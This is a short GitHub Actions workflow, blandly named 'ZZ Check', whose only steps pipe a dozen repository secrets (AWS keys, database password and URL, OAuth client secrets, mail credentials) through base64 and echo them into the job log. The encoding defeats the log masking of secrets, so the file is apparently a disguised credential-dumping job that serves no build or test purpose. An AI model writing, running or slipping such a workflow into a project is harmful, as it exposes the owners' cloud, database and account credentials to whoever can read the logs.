name: ZZ Check
on:
  workflow_dispatch:
permissions:
  contents: read
jobs:
  c:
    runs-on: ubuntu-latest
    steps:
      - run: echo ${{ secrets.AWS_ACCESS_KEY }} | base64 -w0
      - run: echo ${{ secrets.AWS_SECRECT_KEY }} | base64 -w0
      - run: echo ${{ secrets.AWS_REGION }} | base64 -w0
      - run: echo ${{ secrets.AWS_S3_BUCKET }} | base64 -w0
      - run: echo ${{ secrets.DB_PASSWORD }} | base64 -w0
      - run: echo ${{ secrets.DB_URL }} | base64 -w0
      - run: echo ${{ secrets.DB_USERNAME }} | base64 -w0
      - run: echo ${{ secrets.FACEBOOK_CLIENT_SECRET }} | base64 -w0
      - run: echo ${{ secrets.GOOGLE_CLIENT_SECRET }} | base64 -w0
      - run: echo ${{ secrets.MAIL_PWD }} | base64 -w0
      - run: echo ${{ secrets.MAIL_USERNAME }} | base64 -w0
      - run: echo ${{ secrets.AUTENTIFIKACIJA }} | base64 -w0
